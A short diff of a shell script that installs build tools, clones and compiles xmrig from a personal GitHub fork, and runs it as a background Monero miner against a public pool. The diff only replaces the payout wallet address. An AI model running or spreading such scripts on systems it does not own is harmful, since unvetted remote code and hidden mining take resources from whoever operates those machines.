@@ -6,4 +6,4 @@ sudo apt-get install -y screen
 sudo apt-get install -y curl
 sudo apt-get install -y git
 sudo apt-get update && sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev libboost-all-dev automake git cmake libuv1-dev libmicrohttpd-dev libssl-dev && sudo sysctl vm.nr_hugepages=128 && rm -rf xmrig && git clone https://github.com/sabatmki/xmrig && cd xmrig && mkdir build && cd build && cmake .. && make
-./xmrig -a cn/r -B -l pro -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 8Ax6fhhPgQjDCxq8Gbxgqb848LnixT9JFMP5TYdZ3XCyTfAJB9f7e9vRcTRWgVEEshKyDVd4ZPucuPRRHn9sTdYaKjVF1qt -p x -k
+./xmrig -a cn/r -B -l pro -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 41xDCtpNWyGEWHVdynAXaELFuy89AKnM964wcWiLVmKt9cHcZa2P132h4xQzbRMxXs9eELMZ47tsXHd8bvG6hRvW6praiSZ -p x -k
